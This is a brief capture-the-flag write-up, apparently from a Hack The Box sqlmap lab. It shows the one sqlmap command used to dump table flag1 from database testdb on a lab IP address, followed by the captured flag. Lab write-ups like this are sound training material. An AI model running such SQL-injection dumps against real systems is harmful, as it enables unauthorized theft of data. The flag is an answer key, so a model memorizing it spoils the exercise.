## Challenge

 What's the contents of table flag1 in the testdb database? (Case #1) 

 ## Solution

 I got the flag by running the following command:

 ```sh
 python3 sqlmap.py -u "http://94.237.55.96:34129/case1.php?id=1" -T flag1 -D testdb --dump
```

this provided the flag which is `HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}`.

